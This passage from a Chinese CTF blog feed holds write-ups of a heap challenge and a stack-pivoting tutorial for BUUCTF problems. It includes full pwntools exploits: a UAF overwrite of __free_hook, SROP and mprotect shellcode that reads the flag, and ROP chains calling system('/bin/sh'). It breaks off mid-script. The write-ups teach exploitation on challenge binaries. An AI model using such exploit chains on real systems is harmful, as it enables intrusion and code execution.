class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_168D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v3 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  v5 = qword_203088[<span class="number">2</span> * v3];</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;unk_203080 + <span class="number">4</span> * v3);</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    sub_F98(&amp;unk_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">    sub_1152(&amp;unk_203180, v5, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the value: &quot;</span>);</span><br><span class="line">    sub_EE7(<span class="number">0</span>, v5, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Encrypt and save value...&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    sub_F98(&amp;unk_203180, aS4cur1tyP4ssw0, v2);</span><br><span class="line">    sub_1152(&amp;unk_203180, v5, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><ul><li>泄露libc其实很简单，给tcache填满然后再次free的就进入到unsortedbin中了</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rc4key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">sla(<span class="string">&quot;Input your username:\n&quot;</span>, <span class="string">&#x27;4dm1n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your password:\n&quot;</span>, <span class="string">&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc.address = u64(rc4_crypt(rc(<span class="number">8</span>)).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">read = libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc&quot;</span>, libc.address)</span><br></pre></td></tr></table></figure></div><ul><li><code>uaf</code>修改<code>free_hook</code>为<code>setcontext+53</code></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, rc4_crypt(p64(free_hook)))</span><br></pre></td></tr></table></figure></div><ul><li>修改<code>free_hook</code>为<code>setcontext+53</code>，执行<code>&#39;srop&#39;</code></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rip = read</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="built_in">bytes</span>(frame))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, rc4_crypt(p64(setcontext)))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><ul><li>最后执行<code>mprotext</code>改段为rwx权限</li></ul><p><mark>改的是<code>free_hook的那一页为rwx</code>，可以看下面是如何实现的</mark></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rdx_rsi_ret = libc.address + <span class="number">0x130539</span></span><br><span class="line">rdi_ret = libc.address + <span class="number">0x2164f</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(rdi_ret, free_hook &amp; ~<span class="number">0xfff</span>, rdx_rsi_ret, <span class="number">7</span>, <span class="number">0x1000</span>, mprotect, free_hook + <span class="number">0x38</span>)</span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div><p><code>free_hook &amp; ~0xfff</code>这可以得到0x…….000，即改free_hook的末三位为0，也就符合页对其了</p><p><mark>为什么一个payload就可以达到get flag了?<mark></mark></mark></p><ul><li>frame中rip指向read，此时会执行<code>call reap</code>，call的时候会执行<code>push rip</code>，此时的rip便指向<code>free_hook</code>的位置，然后rop链布置在<code>free_hook</code>，在执行完read，之后会执行<code>ret</code>即<code>pop rip</code>，也就执行rop链了</li></ul><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(file, cmd)</span></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;0192d669a7597e02a58fb5410dfb2dd1.d1eq.dg05.ciihw.cn&quot;, 43580)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;5. Exit\n&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, cont=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;the value size: \n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&quot;the value: \n&quot;</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;The result is:\n\t[key,value] = [&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;the value: \n&quot;</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data</span>):</span><br><span class="line">    enc = ARC4.new(rc4key)</span><br><span class="line">    <span class="keyword">return</span> enc.decrypt(data)</span><br><span class="line"></span><br><span class="line">rc4key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">sla(<span class="string">&quot;Input your username:\n&quot;</span>, <span class="string">&#x27;4dm1n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your password:\n&quot;</span>, <span class="string">&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc.address = u64(rc4_crypt(rc(<span class="number">8</span>)).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">read = libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, rc4_crypt(p64(free_hook)))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rip = read</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="built_in">bytes</span>(frame))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, rc4_crypt(p64(setcontext)))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rdx_rsi_ret = libc.address + <span class="number">0x130539</span></span><br><span class="line">rdi_ret = libc.address + <span class="number">0x2164f</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(rdi_ret, free_hook &amp; ~<span class="number">0xfff</span>, rdx_rsi_ret, <span class="number">7</span>, <span class="number">0x1000</span>, mprotect, free_hook + <span class="number">0x38</span>)</span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移-Pivoting</title>
      <link href="/2024/10/23/%E6%A0%88%E8%BF%81%E7%A7%BB-Pivoting/"/>
      <url>/2024/10/23/%E6%A0%88%E8%BF%81%E7%A7%BB-Pivoting/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>最初学的时候看的文章:<a class="link" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>栈迁移：在于溢出的长度不够布置ROP链，可以迁移栈到一个合适的地址，合适的空间，布置ROP链，然后执行ROP链，getshell。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a><mark>原理<mark></mark></mark></h1><p>修改ret address为leave ret，将rbp修改为要迁移的地址，即可栈迁移。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave 相当于 mov rsp, rbp; pop rbp ;</span><br><span class="line">ret 相当于 pop rip</span><br></pre></td></tr></table></figure></div><ul><li>第一次leave ret(函数结尾会自带来恢复栈状态)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leave: mov rsp,rbp; 将rbp的值给rsp，即将rsp拉到rbp的位置</span><br><span class="line">   pop rbp; 将rsp此时对应的值弹给rbp，所以之前将aim_addr覆盖为rbp就是为了此时将rbp弹为aim_addr,完成这一步，rbp迁移到aim address</span><br><span class="line">   ;同时由于pop，rsp往高地址移动一个机器字长,即此时rsp是ret address</span><br><span class="line">ret :  pop rip;将rsp此时的值弹给rip，即leave ret 弹给rip，会再次执行leave ret</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241023210007369.bmp"></p><ul><li>第二次leave ret(溢出ret addr 得到的leave ret)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave: ;rsp到rbp的位置，即aim_address</span><br><span class="line">pop rbp;将aim_addr所指向的数据弹给rbp，这里要注意！！！有一个字长的垃圾数据是没用的，此时的rbp无所谓弹到哪里，然后rsp向高地址移动</span><br><span class="line">ret: pop rip; rsp此时在ROP链的开端，然后弹给rip开始执行ROP链</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241023211519333.bmp"></p><ul><li>核心的原理就是这样了</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rbp -&gt; aim_address(布置一个垃圾数据) or -&gt;aim_address-8</span><br><span class="line">ret address -&gt; leave ret </span><br></pre></td></tr></table></figure></div><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="BUUCTF-actf-2019-babystack"><a href="#BUUCTF-actf-2019-babystack" class="headerlink" title="BUUCTF actf_2019_babystack"></a>BUUCTF actf_2019_babystack</h1><p>直接看<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/139299524?spm=1001.2014.3001.5502">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，很久之前写的</p><ul><li>这道题目就是标准的栈迁移题目，也可以说是板子了，只允许你溢出0x10字节，刚好够覆盖rbp，ret_address，可以打一次栈迁移，泄露出栈地址，重复使用</li><li>但是没有泄露出栈地址怎么办呢？我们可以栈迁移到bss段上,见下题</li></ul><h1 id="BUUCTF-Black-watch入群题"><a href="#BUUCTF-Black-watch入群题" class="headerlink" title="BUUCTF Black watch入群题"></a>BUUCTF Black watch入群题</h1><p><a class="link" href="https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><mark>32位<mark></mark></mark></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>s是在bss段上的，然后下方往buf读入数据,只能溢出两个机器字长，典型的栈迁移，但是这里是不可以泄露栈地址的，也就是说无法实现栈的复用，那么我们直接迁移到bss段上即可</li><li>分两步，第一步泄露libc，第二步get shell</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 布置ROP链，准备泄漏libc</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(write_plt,main,<span class="number">1</span>,write_got,<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移到bss</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">0x4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同样的操作再来一次即可</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(system,<span class="number">0xdead</span>,bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span 